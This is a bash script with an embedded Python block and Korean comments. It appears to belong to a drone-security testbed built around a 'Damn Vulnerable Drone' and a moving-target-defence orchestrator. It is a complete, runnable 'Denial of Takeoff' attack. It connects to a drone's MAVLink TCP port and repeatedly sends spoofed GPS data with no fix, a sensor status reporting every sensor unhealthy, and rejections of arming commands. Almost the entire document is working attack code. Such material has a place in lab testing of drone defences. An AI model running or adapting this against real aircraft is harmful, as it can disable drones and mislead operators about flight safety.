#!/usr/bin/env bash
set -euo pipefail

# Attack: Denial of Takeoff (GPS/System Status Spoofing + Arming Denial, MTD-aware)
# Target Service: DRONE_MAVLINK_TCP (Default Port 5760)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (MAVLink TCP 연결을 기본으로 가정)
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
    DRONE_MAVLINK_TCP)
        TARGET_PORT="${TARGET_PORT:-5760}"
        ;;
    DRONE_MAVLINK)
        # 만약 UDP를 사용한다면 14550을 사용하도록 명시
        TARGET_PORT="${TARGET_PORT:-14550}"
        ;;
    *)
        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=denial-of-takeoff src=Denial-of-Takeoff.md"
log "[BLOCK 1] type=python (Consolidated MAVLink Spoofing Loop)"

# 모든 공격 로직을 하나의 Python 인라인 블록으로 통합하여 실행합니다.
# '-u' 옵션을 사용하여 버퍼링 없이 실시간 출력을 보장합니다.
sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os
import sys
import time
from pymavlink import mavutil

# 인수 없으면 환경변수 TARGET_IP:TARGET_PORT 사용 (Fallback/Debug)
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '5760')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

target_ip, target_port_str = sys.argv[1].split(':', 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port: {target_port_str}")
    sys.exit(1)

def main(target_ip, target_port):
    # TCP 연결을 시도합니다.
    try:
        master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
        master.wait_heartbeat()
        print(f"[INFO] Connected to drone at {target_ip}:{target_port}.")
    except Exception as e:
        print(f"[ERROR] MAVLink connection failed: {e}")
        sys.exit(1)

    print("[INFO] Starting Denial of Takeoff Spoofing loop...")
    
    # 공격 루프 시작: GPS 스푸핑, 시스템 상태 악화, 무장 거부를 지속적으로 전송
    while True:
        current_time_us = int(time.time() * 1e6)

        # 1. GPS Spoofing (Fix Type 1: No usable fix)
        master.mav.gps_raw_int_send(
            time_usec=current_time_us,
            fix_type=1,         # No usable fix
            lat=0,              # Glitch position
            lon=0,
            alt=0,
            eph=1000,           # High HDOP/VDOP
            epv=1000,
            vel=0,
            cog=0,
            satellites_visible=0
        )

        # 2. SYS_STATUS Corruption (Sensors Health 0: Unhealthy)
        master.mav.sys_status_send(
            onboard_control_sensors_present=0xFFFFFFFF,
            onboard_control_sensors_enabled=0xFFFFFFFF,
            onboard_control_sensors_health=0x00000000,
            load=500,
            voltage_battery=12000,
            current_battery=100,
            battery_remaining=90,
            drop_rate_comm=0,
            errors_comm=0,
            errors_count1=1,
            errors_count2=1,
            errors_count3=1,
            errors_count4=1
        )
        
        # 3. COMMAND_ACK (MAV_CMD_COMPONENT_ARM_DISARM 거부)
        # 이 메시지는 Arming 시도가 있을 때만 효과적이지만, 지속적으로 보내면 잠재적인 Arming 시도를 차단.
        master.mav.command_ack_send(
            command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
            result=mavutil.mavlink.MAV_RESULT_FAILED
        )

        # print("[!] Spoofing packets sent (GPS, SYS_STATUS, ARM_REJECT)") # 너무 많은 출력 방지
        time.sleep(0.1) # 공격 속도 조절

if __name__ == "__main__":
    try:
        main(target_ip, target_port)
    except KeyboardInterrupt:
        print("\n[INFO] Attack stopped by user (KeyboardInterrupt).")
    except Exception as e:
        print(f"[CRITICAL ERROR] Attack execution failed: {e}")

PY

log "[BLOCK 2] type=control (In-Foreground Execution)"
# 공격은 Python 인라인 블록에서 포그라운드로 실행되며, Orchestrator에 의해 라이프사이클이 관리됩니다.